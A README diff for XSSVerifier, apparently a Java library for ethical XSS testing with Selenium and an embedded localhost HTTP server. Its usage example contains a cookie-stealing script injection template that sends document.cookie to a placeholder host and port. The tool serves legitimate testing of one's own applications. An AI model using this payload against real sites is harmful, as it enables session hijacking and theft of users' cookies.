@@ -13,7 +13,7 @@ To prove the wep applications are XSS-free Selenium test can be used (o you can 
 
 In order to do ethicial XSS testing you require simple http server running on the localhost (i.e on the same machine as browser opening the application). The Xssverifier software runs on the top of lightweight nanohttpd java http server.
 
-===Usage example===
+##Usage example
 ```java
 XSSCheck x=XSSVerifier.createNewCheck(4567,"xss.gif","<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>");
 /* 4567 is a port number where the XSS checker's embbedded http server runs, xss.gif is a resource, the last string is  javascript injection template*/
@@ -49,5 +49,5 @@ while (!x.getXSSCookieHijacked("visited"))
 //so the particular cookie was hijacked and that was verified
 ```
 
-===Notes===
+##Notes
 The xssverifier library doesn't check availability of the ports on your local machine. You should ensure that port is not already bint before creating the sniffer.
